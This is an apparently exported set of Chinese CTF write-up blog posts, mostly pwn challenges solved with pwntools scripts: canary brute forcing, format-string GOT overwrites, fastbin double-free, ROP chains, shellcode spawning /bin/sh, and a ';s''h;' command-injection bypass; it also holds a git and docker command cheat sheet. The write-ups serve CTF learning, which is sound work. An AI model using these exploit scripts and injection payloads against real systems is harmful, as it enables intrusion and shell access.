[{"title":"23DAS_WP","url":"/2023/10/23/23%E6%98%A5%E6%A0%A1%E8%B5%9BWP%20-%20%E5%89%AF%E6%9C%AC/","content":"daspwn1from pwn import *context(arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)#p = process(&quot;./GuestBook&quot;)p=remote(&quot;node4.buuoj.cn&quot;,27600)payload=b&#x27;a&#x27;*0x18+b&#x27;^&#x27;p.sendafter(&quot;Please input your name: &quot;,payload)p.recvuntil(&quot;^&quot;)canary=p.recv(7)print(canary)p.sendlineafter(&quot;(MAX 4): &quot;,b&#x27;3&#x27;)sleep(1)payload=b&#x27;a&#x27;*(0xA8)+p64(0x0000000004012C3)# attach(p,#        &#x27;&#x27;&#x27;#        b *0x40147d#        c#        &#x27;&#x27;&#x27;#        )p.sendline(payload)payload=b&#x27;a&#x27;*(0xA0-0x20-8)+b&#x27;a&#x27;+canaryp.sendline(payload)payload=b&#x27;a&#x27;*(0xA0-0x40-8)p.sendline(payload)p.interactive()\n\npwn2PING指令里面有漏洞，本质是一个system函数，用两个;屏蔽前后的文本，再利用两个单引号绕过字符串检查\n;s’’h;\n","categories":["参赛WP"],"tags":["23","DAS","WP"]},{"title":"23国赛WP","url":"/2023/07/23/23%E5%9B%BD%E8%B5%9BWP/","content":"签到题输错代码后，会看到官方提示：\n\npython3打印文件内容：\nprint(open(&#x27;/etc/passwd&#x27;).read())\n\n可以猜测是需要通过输入代码打开什么文件，索性尝试/flag，输入print(open(&#39;/flag&#39;).read())结果如下：\n\n获得flag&#123;Od2e2ea0-0896-4ee6-a925-09acee3db3a9&#125;&#125;\n国粹题干：\n\n\n可以看到最后两张图长度相同，对齐后有一定的规律\n\n第一行相同牌面对应第二行的牌面没有重复的\n\n第一行相同的牌面，第二行对应的牌面按照一定的顺序排列：\n\n一万 到 九万\n\n一饼 到 九饼\n\n一条 到 九条\n\n东南西北风\n\n中发白\n\n春夏秋冬\n\n梅兰竹菊\n\n\n\n\n同时题干图片中第一行第一个为空白第二行以一个为一万，可以联想到坐标轴，\n于是尝试将(a,k)对应的各个点描出：\n\n可以隐约发现flag&#123;&#125;，对图片进行翻转操作后：\n\n最后获得flag&#123;202305012359&#125;\nModbus题目为一个流量包，根据题干提示（还有高人指点），筛选modbus协议的流量包：\n\n注意最后的Word Count，将前14个流量包对应的十六进制提取出来拼接获得\nMMYWMX3GNEYWOXZRGAYDA===，再通过Base32解码获得c1f_fi1g_1000.\n于是flag&#123;c1f_fi1g_1000&#125;（本题一直摸鱼，全靠队友:joy:）\nBabyre打开附件babyre.xml可以看到https://snap.berkeley.edu访问将文件导入：\n查看关键元素（lock）代码：\n\n尝试运行（注意在设置中开启JavaScript拓展），发现需要输入一串字符，阅读关键部分代码。\n\n可以看到键入输进去的字符按照Unicode编码相邻异或后得到test\n\n对比了test和secret的字符是否相同。\n所以先修改程序使其输出secret：\n\n获得如下一串数字：\n102 10 13 6 28 74 3 1 3 7 85 0 4 75 20 92 92 8 28 25 81 83 7 28 76 88 9 0 29 73 0 86 4 87 87 82 84 85 4 85 87 30\n根据异或特性，编写逆向程序：\nl=[102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30]c=[&#x27;f&#x27;]for i in range(len(l)-1):    c.append(chr(l[i+1]^ord(c[i])))for c in c:    print(c,end=&#x27;&#x27;)\n\n输出结果：\nflag&#123;12307bbf-9e91-4e61-a900-dd26a6d0ea4c&#125;\nFuncanary​                               \n用ida查看代码，发现这是一个利用fork实现无限循环的函数，\n同时发现一个后门函数·\n\n\n  每次会调用shuru函数\n查看shuru函数\n\n发现了一个溢出点\n查看保护措施\n\n\n保护全开\n查看栈结构\n\n思路明确了，想办法绕开金丝雀值，修改返回地址到后门函数上\n而结合无限循环的特性，我可以写一个脚本来逐位爆破canary值，而结合题目的保护设施，后门函数的地址也会变，所以我再写一个爆破脚本，通过最多500次尝试找出正确的后门\nExp：\n\\#coding=utf8from pwn import *import random\\# context.log_level = &#x27;debug&#x27;\\# context.terminal = [&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;bash&#x27;,&#x27;-c&#x27;]\\# context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)p = remote(&#x27;47.93.249.245&#x27;,&#x27;13230&#x27;)  canary = b&#x27;\\x00&#x27;for k in range(7):  for i in range(256):​    \\# print(&quot;正在爆破Canary的第&quot; + str(k+1) + &quot;位&quot;)​    \\# print(&quot;当前的字符为&quot; + chr(i))​    p.recvuntil(b&quot;welcome\\n&quot;)​    payload = b&#x27;a&#x27; * 104 + canary + p8(i)​    \\#print(&quot;当前payload为：&quot;, payload)​    p.send(b&#x27;a&#x27; * 104 + canary + p8(i))​    data = p.recvuntil(b&#x27;fun&#x27;,timeout=0.4)​    \\# print(data)​    if b&quot;fun&quot; in data:​      canary += p8(i)​      print(b&quot;Canary is: &quot; + canary)​      breakprint(b&#x27;can&#x27;,hex(u64(canary)))pause()context.log_level=&#x27;debug&#x27;for k in range(500):  p.recvuntil(b&#x27;welcome\\n&#x27;)  i=random.randint(0,14)  payload = b&#x27;A&#x27;*104 +canary+p64(0x7fffffffdddddddd) + p8(0x31)+p8(0x02+i*16)  p.send(payload)\n\n","categories":["参赛WP"],"tags":["23","WP","国赛"]},{"title":"23春校赛WP","url":"/2023/07/23/23%E6%98%A5%E6%A0%A1%E8%B5%9BWP/","content":"签到：在微信公众号发送flag，得到flag\nBase： 十六进制转base64，再转随波逐流一把梭\nRot13：就一层加密，rot13解密后套flag\nRsa：百度到原题复制粘贴\n山岚：谐音“栅栏”，随波逐流一把梭\nMiao：查看ida，发现直接给了shell，尝试cat flag结果输出喵喵喵\n尝试套flag{}错误，后来尝试后发现禁用cat，一旦cat就会喵喵喵，找到Linux等效的指令\nBaby_re：看不到main函数，查壳，发现upx壳，upx -d一键脱壳，解数独类逆向，gdb调试出数独表，找到网站解出\n上午场未解出题目","categories":["参赛WP"],"tags":["23","WP","校赛"]},{"title":"git和docker常用指令","url":"/2023/09/23/git%E5%92%8Cdocker%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/","content":"git基础指令\n\n1、仓库# 在当前目录新建一个Git代码库$ git init# 新建一个目录，将其初始化为Git代码库$ git init [project-name]# 下载一个项目和它的整个代码历史$ git clone [url]\n\n2、配置# 显示当前的Git配置$ git config --list# 编辑Git配置文件$ git config -e [--global]# 设置提交代码时的用户信息$ git config [--global] user.name &quot;[name]&quot;$ git config [--global] user.email &quot;[email address]&quot;\n\n3、增加&#x2F;删除文件# 添加指定文件到暂存区$ git add [file1] [file2] ...# 添加指定目录到暂存区，包括子目录$ git add [dir]# 添加当前目录的所有文件到暂存区$ git add .# 添加每个变化前，都会要求确认# 对于同一个文件的多处变化，可以实现分次提交$ git add -p# 删除工作区文件，并且将这次删除放入暂存区$ git rm [file1] [file2] ...# 停止追踪指定文件，但该文件会保留在工作区$ git rm --cached [file]# 改名文件，并且将这个改名放入暂存区$ git mv [file-original] [file-renamed]\n\n4、代码提交# 提交暂存区到仓库区$ git commit -m [message]# 提交暂存区的指定文件到仓库区$ git commit [file1] [file2] ... -m [message]# 提交工作区自上次commit之后的变化，直接到仓库区$ git commit -a# 提交时显示所有diff信息$ git commit -v# 使用一次新的commit，替代上一次提交# 如果代码没有任何新变化，则用来改写上一次commit的提交信息$ git commit --amend -m [message]# 重做上一次commit，并包括指定文件的新变化$ git commit --amend [file1] [file2] ...\n\n5、分支# 列出所有本地分支$ git branch# 列出所有远程分支$ git branch -r# 列出所有本地分支和远程分支$ git branch -a# 新建一个分支，但依然停留在当前分支$ git branch [branch-name]# 新建一个分支，并切换到该分支$ git checkout -b [branch]# 新建一个分支，指向指定commit$ git branch [branch] [commit]# 新建一个分支，与指定的远程分支建立追踪关系$ git branch --track [branch] [remote-branch]# 切换到指定分支，并更新工作区$ git checkout [branch-name]# 切换到上一个分支$ git checkout -# 建立追踪关系，在现有分支与指定的远程分支之间$ git branch --set-upstream [branch] [remote-branch]# 合并指定分支到当前分支$ git merge [branch]# 选择一个commit，合并进当前分支$ git cherry-pick [commit]# 删除分支$ git branch -d [branch-name]# 删除远程分支$ git push origin --delete [branch-name]$ git branch -dr [remote/branch]\n\n6、标签# 列出所有tag$ git tag# 新建一个tag在当前commit$ git tag [tag]# 新建一个tag在指定commit$ git tag [tag] [commit]# 删除本地tag$ git tag -d [tag]# 删除远程tag$ git push origin :refs/tags/[tagName]# 查看tag信息$ git show [tag]# 提交指定tag$ git push [remote] [tag]# 提交所有tag$ git push [remote] --tags# 新建一个分支，指向某个tag$ git checkout -b [branch] [tag]\n\n7、查看信息# 显示有变更的文件$ git status# 显示当前分支的版本历史$ git log# 显示commit历史，以及每次commit发生变更的文件$ git log --stat# 搜索提交历史，根据关键词$ git log -S [keyword]# 显示某个commit之后的所有变动，每个commit占据一行$ git log [tag] HEAD --pretty=format:%s# 显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件$ git log [tag] HEAD --grep feature# 显示某个文件的版本历史，包括文件改名$ git log --follow [file]$ git whatchanged [file]# 显示指定文件相关的每一次diff$ git log -p [file]# 显示过去5次提交$ git log -5 --pretty --oneline# 显示所有提交过的用户，按提交次数排序$ git shortlog -sn# 显示指定文件是什么人在什么时间修改过$ git blame [file]# 显示暂存区和工作区的差异$ git diff# 显示暂存区和上一个commit的差异$ git diff --cached [file]# 显示工作区与当前分支最新commit之间的差异$ git diff HEAD# 显示两次提交之间的差异$ git diff [first-branch]...[second-branch]# 显示今天你写了多少行代码$ git diff --shortstat &quot;@&#123;0 day ago&#125;&quot;# 显示某次提交的元数据和内容变化$ git show [commit]# 显示某次提交发生变化的文件$ git show --name-only [commit]# 显示某次提交时，某个文件的内容$ git show [commit]:[filename]# 显示当前分支的最近几次提交$ git reflog\n\n8、远程同步# 下载远程仓库的所有变动$ git fetch [remote]# 显示所有远程仓库$ git remote -v# 显示某个远程仓库的信息$ git remote show [remote]# 增加一个新的远程仓库，并命名$ git remote add [shortname] [url]# 取回远程仓库的变化，并与本地分支合并$ git pull [remote] [branch]# 上传本地指定分支到远程仓库$ git push [remote] [branch]# 强行推送当前分支到远程仓库，即使有冲突$ git push [remote] --force# 推送所有分支到远程仓库$ git push [remote] --all\n\n9、撤销# 恢复暂存区的指定文件到工作区$ git checkout [file]# 恢复某个commit的指定文件到暂存区和工作区$ git checkout [commit] [file]# 恢复暂存区的所有文件到工作区$ git checkout .# 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变$ git reset [file]# 重置暂存区与工作区，与上一次commit保持一致$ git reset --hard# 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变$ git reset [commit]# 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致$ git reset --hard [commit]# 重置当前HEAD为指定commit，但保持暂存区和工作区不变$ git reset --keep [commit]# 新建一个commit，用来撤销指定commit# 后者的所有变化都将被前者抵消，并且应用到当前分支$ git revert [commit]# 暂时将未提交的变化移除，稍后再移入$ git stash$ git stash pop\n\n10、其他# 生成一个可供发布的压缩包$ git archive\n\ndocker常用指令docker version \t\t# 显示docker版本信息docker info \t\t# 显示docker系统系统信息，镜像以及容器数量等信息docker 命令 --help\t# 帮助命令\n\n\n\nattach    Attach to a running container        \t\t\t#当前she11下attach 连接指定运行镜像build    Build an image from a Dockerfile        \t\t#通过Dockerfile定制镜像commit    Create a new image from a container changes   #提交当前容器为新的镜像cp    Copy files/folders from the containers filesystem to the host path   #从容器中拷贝指定文件或者目录到宿主机中create    Create a new container        \t\t\t\t#创建一个新的容器，同run,但不启动容器diff    Inspect changes on a container&#x27;s filesystem     #查看docker 容器变化events    Get rea1 time events from the server        \t#从docker 服务获取容器实时事件exec    Run a command in an existing container        \t#在已存在的容器上运行命令export    Stream the contents of a container as a tar archive   #导出容器的内容流作为一个tar 归档文件[对应import ]history    show the history of an image        \t\t\t#展示一个镜像形成历史images    List images        \t\t\t\t\t\t\t#列出系统当前镜像import    Create a new filesystem image from the contents of a tarba1l     #从tar包 中的内容创建-一个新的文件系统映像[对应export]info    Display system-wide informati on        \t\t#显示系统相关信息inspect    Return 1ow-1evel information on a container  #查看容器详细信息kill    Ki11 a running container        \t\t\t\t# kill指定docker容器load    Load an image from a tar archive        \t\t#从一个tar包中加载一个镜像[对应save]login    Register or Login to the docker registry server   #注册或者登陆一个docker源服务器logout    Log out from a Docker registry server        \t#从当前Docker registry 退出logs    Fetch the 1ogs of a container        \t\t\t#输出当前容器日志信息port    Lookup the public-facing port which is NAT-ed to PRIVATE_ PORT    #查看映射端口对应的容器内部源端口pause    Pause a11 processes within a container        \t#暂停容器ps    List containers        \t\t\t\t\t\t\t#列出容器列表pull    Pull an image or a repository from the docker registry server     # 从docker镜像源服务器拉取指定镜像或者库镜像push    Push an image or a repository to the docker registry server        #推送指定镜像或者库镜像至docker源服务器restart    Restart a running container        \t\t\t#重启运行的容器rm    Remove one or more containers    \t\t\t\t\t#移除一个或者多个容器rmi    Remove one or more i mages        \t\t\t\t#移除一个或多个镜像[无容器使用该镜像才可删除，否则需删除相关容才可继续或-f强制删除]run    Run a command in a new container        \t\t\t#创建一个新的容器并运行一个命令save    Save an image to a tar archive    \t\t\t\t#保存一个镜像为一个tar包[对应1oad]search    Search for an image on the Docker Hub        \t#在docker hub中搜索镜像start    Start a stopped containers        \t\t\t\t#启动容器stop    Stop a running containers        \t\t\t\t#停止容器tag    Tag an image into a repository    \t\t\t\t#给源中镜像打标签top    Lookup the running processes of a container   \t#查看容器中运行的进程信息unpause    Unpause a paused container        \t\t\t#取消暂停容器version    Show the docker vers ion informati on        #查看docker版本号wait     Block uyntil a container stops，then print its exit code   #截取容器停止时的退出状态值\n\n","categories":["复习"],"tags":["指令"]},{"title":"23校赛WP（场上未解出的几个pwn）","url":"/2023/07/23/23%E6%A0%A1%E8%B5%9BWP%EF%BC%88%E5%9C%BA%E4%B8%8A%E6%9C%AA%E8%A7%A3%E5%87%BA%E7%9A%84%E5%87%A0%E4%B8%AApwn%EF%BC%89/","content":"ikun下载\n人生重开下载\nikun——随机数的应对，双程序的应用from pwn import *context(log_level = &quot;debug&quot;,arch = &quot;amd64&quot;,os = &quot;linux&quot;)elf=ELF(&quot;./ikun&quot;)puts_got = elf.got[&quot;puts&quot;]shell=elf.sym[&quot;realback&quot;]print(hex(shell))offset = 12print(hex(shell))payload2 = fmtstr_payload(offset, &#123;puts_got: shell&#125;)s=process(&quot;./suiji&quot;)p=process(&quot;./ikun&quot;)payload1=&quot;kunaaaaaaaa@&quot;p.send(payload1)p.recvuntil(&quot;@&quot;)sand = u64(p.recvuntil(&#x27;\\x64&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))s.sendline(str(sand))for i in range(114):    t=s.recvline()    p.sendafter(&quot;do:(c/t/r/l)&quot;,t)    s.sendline()p.sendafter(&quot;Input what you want to say&quot;,payload2)p.interactive()\n\nsuiji为自行编写的c程序，代码如下\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;int main()&#123;  unsigned int seed;   int random_number;   int i;   scanf(&quot;%u&quot;, &amp;seed);  getchar(); //consume extra newline character  srand(seed);  for (i = 0; i &lt;= 113; ++i)  &#123;    random_number = rand() % 4;    if (random_number == 0)    &#123;      printf(&quot;%c\\n&quot;, &#x27;c&#x27;);    &#125;    else if (random_number == 1)    &#123;      printf(&quot;%c\\n&quot;, &#x27;t&#x27;);    &#125;    else if (random_number == 2)    &#123;      printf(&quot;%c\\n&quot;, &#x27;r&#x27;);    &#125;    else    &#123;      printf(&quot;%c\\n&quot;, &#x27;l&#x27;);    &#125;    getchar(); //wait for user input to proceed to next iteration  &#125;  return 0;&#125;\n\n使用这样的程序嵌套，可以避免被一些绕过性的问题打断脚本\n人生重开模拟器——调用文件时多次服务器连接造成漏洞有三个函数调用了一个文件，漏洞就出自这里，由于在同一个端口，所以nc服务器以后会使用同一个文件，可以巧妙地利用文件操作，使其中一个窗口的钱数超过200万\n\n初始钱数，这个函数会将money.txt中的钱置零，所以在使用多个窗口时，要先触发这个函数，跳过以后再执行\n\n\n这个函数会根据参数增加钱数，保存到文件中\n思路：\n开20个窗口，全部进行到取名字以后\n如果出现“你爸爸告诉你家里面很有钱”，直接把这个窗口关掉，不然会导致扣掉一百万\n出现其他的字样，保留\n随后我们就可以在剩余的窗口里面赚钱（初始的钱数也会叠加）\n钱到达200万，创业，get shell\n","categories":["参赛WP"],"tags":["23","WP","校赛"]},{"title":"23省赛WP","url":"/2023/07/23/23%E7%9C%81%E8%B5%9BWP/","content":"lvyou——可以爆破的一个小pwn很简单就溢出了，但是由于开启了pie所以函数的基址不确定，所以采用爆破\n\nfrom pwn import*#p=process(&#x27;./lvyou&#x27;)for i in range(500):    p=remote(&quot;121.196.192.181&quot;,10001)    #p = process(&#x27;./lvyou&#x27;)    payload=b&#x27;a&#x27;*0x28+p8(0x9a)+p8(0x52)    p.recvuntil(b&#x27;choice :\\n&#x27;)    p.sendline(b&#x27;1&#x27;)    p.send(payload)    p.interactive()\n","categories":["参赛WP"],"tags":["23","WP","省赛"]},{"title":"heshi与das二进制专项的邂逅","url":"/2023/11/19/heshi%E4%B8%8Edas%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9%E7%9A%84%E9%82%82%E9%80%85/","content":"foooood（跟我的题思路一模一样，气死）from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)  #need tmuxcontext.log_level=&quot;debug&quot;# p = remote(&quot;node4.buuoj.cn&quot;, 26443)p = process(&quot;./pwn&quot;)p.sendlineafter(&quot;Give me your name:&quot;, b&quot;/bin/sh&quot;)p.sendlineafter(&quot;food:&quot;, b&#x27;%9$p^%11$p^&#x27;)libc_base = int(p.recvuntil(&quot;^&quot;)[10:-1], 16) - 0x20750 - 240  # __libc_start_mainstack = int(p.recvuntil(&quot;^&quot;)[:-1], 16)i_addr = stack - 0x7ffc0bd8af08 + 0x7ffc0bd8ae40one = libc_base + 0x45226print(hex(one))p.sendlineafter(&quot;food:&quot;, &quot;%&#123;&#125;p%11$hn&quot;.format((i_addr - 0x30 + 4) &amp; 0xffff))# attach(p)p.sendlineafter(&quot;food:&quot;, &quot;%&#123;&#125;p%37$hhn&quot;.format(1))p.sendlineafter(&quot;food:&quot;, &quot;%&#123;&#125;p%11$hn&quot;.format((i_addr - 0x18) &amp; 0xffff))# attach(p)p.sendlineafter(&quot;food:&quot;, &quot;%&#123;&#125;p%37$hn&quot;.format(one &amp; 0xffff))p.sendlineafter(&quot;food:&quot;, &quot;%&#123;&#125;p%11$hn&quot;.format((i_addr - 0x18 + 2) &amp; 0xffff))# attach(p)p.sendlineafter(&quot;food:&quot;, &quot;%&#123;&#125;p%37$hhn&quot;.format((one &amp; 0xff0000) // 0x10000))for i in range(8):    p.sendlineafter(&quot;food:&quot;, &quot;1&quot;)# attach(p)p.sendlineafter(&quot;food:&quot;, &quot;1&quot;)print(hex(libc_base))p.interactive()\n\n另外，居然能循环打印栈，等环境变量FLAG\neasynote（两个大洞，但one不通）uaf和堆溢出都有做法挺多，后面试试\n1.改堆指针表，写free_got，free一个“&#x2F;bin&#x2F;sh”(我的exp)\n2.reaclloc调栈，跳malloc_hook的one\n3.unlinlk\nfrom pwn import *context(arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;, os=&#x27;linux&#x27;)elf=ELF(&quot;./pwn&quot;)def malloc(size, contet):    p.sendlineafter(&quot;5. exit&quot;, b&#x27;1&#x27;)    p.sendlineafter(&quot;---&gt;&quot;, str(size))    p.sendafter(&quot;---&gt;&quot;, contet)def free(id):    p.sendlineafter(&quot;5. exit&quot;, b&#x27;3&#x27;)    p.sendlineafter(&quot;---&gt;&quot;, str(id))def edit(id,size,contet):    p.sendlineafter(&quot;5. exit&quot;, b&#x27;2&#x27;)    p.sendlineafter(&quot;---&gt;&quot;, str(id))    p.sendlineafter(&quot;---&gt;&quot;, str(size))    p.sendafter(&quot;---&gt;&quot;, contet)def show(id):    p.sendlineafter(&quot;5. exit&quot;, b&#x27;4&#x27;)    p.sendlineafter(&quot;---&gt;&quot;, str(id))# p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;, 26517)libc = ELF(&#x27;libc-2.23.so&#x27;)malloc(0x80, b&#x27;qwer&#x27;)malloc(0x80, b&#x27;qwer&#x27;)malloc(0x68, b&#x27;qwer&#x27;)malloc(0x68, b&#x27;qwer&#x27;)malloc(0x68, b&#x27;/bin/sh&#x27;)free(0)show(0)p.recvuntil(&quot;:&quot;)libc_base = u64(p.recv(7)[1:] + b&#x27;\\0&#x27; * 2) - 0x7fef613c4b78 + 0x7fef61000000system = libc_base + libc.sym[&quot;system&quot;]free_got = elf.got[&#x27;free&#x27;]# pause()free(2)free(3)free(2)malloc(0x68, p64(0x0000000006020C0 - 0x23))malloc(0x68, &#x27;ase&#x27;)malloc(0x68, &#x27;ase&#x27;)print(hex(libc_base))print(hex(free_got))malloc(0x68, b&#x27;a&#x27; * (0x23 - 0x10) + p64(free_got))# attach(p)edit(0, 10, p64(system))p.sendlineafter(&quot;5. exit&quot;, b&#x27;3&#x27;)p.sendlineafter(&quot;---&gt;&quot;, b&#x27;4&#x27;)p.interactive()\n","categories":["刷题"],"tags":["DAS","刷题"]},{"title":"Hello World","url":"/2023/11/19/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"polarCTF的WP","url":"/2023/09/23/polarCTF%E7%9A%84WP/","content":"playfrom pwn import *p = remote(&quot;123.60.135.228&quot;, 2102)elf = ELF(&quot;play&quot;)context(log_level = &quot;debug&quot;,arch = &quot;amd64&quot;,os = &quot;linux&quot;)buf=0x00000000006010A0shellcode = asm(shellcraft.sh())p.sendlineafter(&#x27;I think you must enjoy playing.&#x27;,shellcode)payload=(0x30+8)*b&#x27;a&#x27;+p64(buf)p.sendlineafter(&quot;Name your favorite game?&quot;,payload)p.interactive()\n\n\n\nname4from pwn import *p = remote(&quot;123.60.135.228&quot;,2082)#p=process(&#x27;name4&#x27;)context(log_level = &quot;debug&quot;,arch = &quot;i386&quot;,os = &quot;linux&quot;)start=0x0804869Eread=0x08048410buf=0xff8f8000shellcode =asm(shellcraft.sh())payload1=p32(0)p.sendlineafter(&#x27;Enter your name:&#x27;,payload1)p.sendlineafter(&#x27;Enter your best friend name:&#x27;,b&#x27;1&#x27;)payload2=(0x20+4)*b&#x27;a&#x27;+p32(read)+p32(buf)+p32(0)+p32(buf)+p32(100)#attach(p)p.sendlineafter(&quot;give you stack overflow:&quot;,payload2)#attach(p)p.sendlineafter(&quot;byebye&quot;,shellcode)p.interactive()\n\n\n\ndogfrom pwn import *p = remote(&quot;123.60.135.228&quot;,2084)#p=process(&#x27;name4&#x27;)context(log_level = &quot;debug&quot;,arch = &quot;i386&quot;,os = &quot;linux&quot;)payload=b&#x27;a&#x27;*(9+4)+p32(0x0804859B)p.sendlineafter(&quot;This puppy needs to eat a few bones?&quot;,payload)p.interactive()\n\n\n\nfishfrom pwn import *p = remote(&quot;123.60.135.228&quot;,2149)#p=process(&#x27;fish&#x27;)context(log_level = &quot;debug&quot;,arch = &quot;i386&quot;,os = &quot;linux&quot;)payload=(0x6C+4)*b&#x27;a&#x27;+p32(0x08048450)+p32(0x08048480)+p32(0x0804A080)+p32(0x0804A080)#                             gets           sys          buf              bufp.sendline(payload)p.sendline(b&#x27;/bin/sh&#x27;)p.interactive()\n\nfmtfrom pwn import *p = remote(&quot;123.60.135.228&quot;,2076)#p=process(&#x27;fish&#x27;)n=0x0804A030payload = fmtstr_payload(6, &#123;n : 4&#125;)p.sendlineafter(&quot;What&#x27;s your name?&quot;,payload)p.interactive()\n\n03ret2syscall_32from pwn import *a = remote(&quot;123.60.135.228&quot;,2136)#a=process(&#x27;03ret2syscall_32&#x27;)p = (0x208+4)*b&#x27;a&#x27;# ROP chain for 32-bit# pop edx ; retp = (0x208+4)*b&#x27;a&#x27;p += p32(0x0806f22a) # pop edx ; retp += p32(0x080ea060) # @ .datap += p32(0x080b8576) # pop eax ; retp += b&#x27;/bin&#x27;p += p32(0x08054b8b) # mov dword ptr [edx], eax ; retp += p32(0x0806f22a) # pop edx ; retp += p32(0x080ea064) # @ .data + 4p += p32(0x080b8576) # pop eax ; retp += b&#x27;//sh&#x27;p += p32(0x08054b8b) # mov dword ptr [edx], eax ; retp += p32(0x0806f22a) # pop edx ; retp += p32(0x080ea068) # @ .data + 8p += p32(0x080494b3) # xor eax, eax ; retp += p32(0x08054b8b) # mov dword ptr [edx], eax ; retp += p32(0x080481c9) # pop ebx ; retp += p32(0x080ea060) # @ .datap += p32(0x080ded85) # pop ecx ; retp += p32(0x080ea068) # @ .data + 8p += p32(0x0806f22a) # pop edx ; retp += p32(0x080ea068) # @ .data + 8p += p32(0x080494b3) # xor eax, eax ; retp += p32(0x0807ac0f) # inc eax ; retp += p32(0x0807ac0f) # inc eax ; retp += p32(0x0807ac0f) # inc eax ; retp += p32(0x0807ac0f) # inc eax ; retp += p32(0x0807ac0f) # inc eax ; retp += p32(0x0807ac0f) # inc eax ; retp += p32(0x0807ac0f) # inc eax ; retp += p32(0x0807ac0f) # inc eax ; retp += p32(0x0807ac0f) # inc eax ; retp += p32(0x0807ac0f) # inc eax ; retp += p32(0x0807ac0f) # inc eax ; retp += p32(0x0806cea3) # int 0x80a.sendlineafter(&quot;Good Luck.&quot;,p)a.interactive()\n\n\n\nsleepfrom pwn import *from LibcSearcher import *p = remote(&quot;123.60.135.228&quot;,2082)#p= process(&#x27;./sleep&#x27;)context.log_level=&quot;debug&quot;elf=ELF(&quot;sleep&quot;)main_addr = 0x0000000004006BDputs_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]gets_plt = 0x000000000400550pop_rdi_ret=0x0000000000400783payload =b&#x27;a&#x27; * (0x70+8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)+p64(main_addr)#attach(p)p.sendlineafter(&quot;Please cherish every second of sleeping time !!!&quot;,payload)#p.interactive()puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))print(hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)binsh_addr = 0x0000000000601040ret_addr = 0x0000000000400501#attach(p)payload2 = b&#x27;a&#x27; * (0x70+8) +p64(ret_addr)+p64(pop_rdi_ret) + p64(0x000000000601040)+p64(gets_plt)+p64(ret_addr)+p64(main_addr)p.sendlineafter(&quot;Please cherish every second of sleeping time !!!&quot;,payload2)sleep(2)p.sendline(b&#x27;/bin/sh\\0&#x27;)payload2 = b&#x27;a&#x27; * (0x70+8) +p64(ret_addr)+p64(pop_rdi_ret) + p64(binsh_addr)+p64(system_addr)p.sendlineafter(&quot;Please cherish every second of sleeping time !!!&quot;,payload2)p.interactive()\n\n\n\n","categories":["参赛WP"],"tags":["23","WP"]},{"title":"pwn从头开始的复习（fmt篇）","url":"/2023/09/21/pwn%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A4%8D%E4%B9%A0%EF%BC%88fmt%E7%AF%87%EF%BC%89/","content":"具体学习去看西电文档\n格式化字符串修改栈内容from pwn import *# remote()建立远程连接,指明ip和portio = remote(&#x27;node4.buuoj.cn&#x27;,29147)#io=process(&quot;./printf&quot;)payload= p32(0x0804C044) + b&quot;%10$n&quot;io.sendlineafter(&quot;your name:&quot;,payload) #发送数据io.interactive() #与shell进行交互#0804c044\n\n高级运用我自己出的题，字符串空间严重不足，必须利用栈空间\nfmt下载\nfrom pwn import *context.log_level=&quot;debug&quot;p=remote(&quot;ctf.v50to.cc&quot;,10286)#p=process(&quot;./fmt&quot;)for i in range(5):    p.recvuntil(&quot;what&#x27;s &quot;)    a = p.recvuntil(&quot; add &quot;)[:-4]    b = p.recvuntil(&quot;\\n&quot;)[:-1]    c = int(a) + int(b)    print(c)    p.sendline(str(c))p.sendlineafter(&quot;Cherish it&quot;,b&#x27;1&#x27;)fmt=b&quot;%10$p^&quot;p.sendlineafter(&quot;Input:&quot;,fmt)p.recvuntil(&quot;:&quot;)ebp=int(p.recvuntil(&quot;^&quot;)[:-1],16)sleep(1)ret_game_addr=ebp+8a=ret_game_addr%0x100print(a)p.sendlineafter(&quot;[2]leave&quot;,b&#x27;1&#x27;)##weiyi=8fmt=b&quot;%&quot;+str(a).encode()+b&quot;c%10$hhn&quot;p.sendlineafter(&quot;Input:&quot;,fmt)##ebp=10 ret=11sleep(1)#attach(p)p.sendlineafter(&quot;[2]leave&quot;,b&#x27;1&#x27;)#ebp=14 